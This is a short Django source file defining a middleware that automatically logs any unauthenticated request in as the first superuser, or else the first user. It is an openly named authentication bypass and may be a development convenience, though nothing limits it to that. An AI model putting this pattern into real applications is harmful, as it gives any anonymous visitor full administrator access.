from django.contrib.auth import login
from main.models import User

class BypassLoginMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Auto-login if not authenticated
        if hasattr(request, 'user') and not request.user.is_authenticated:
            user = User.objects.filter(is_superuser=True).first() or User.objects.first()
            if user:
                login(request, user)
        return self.get_response(request)
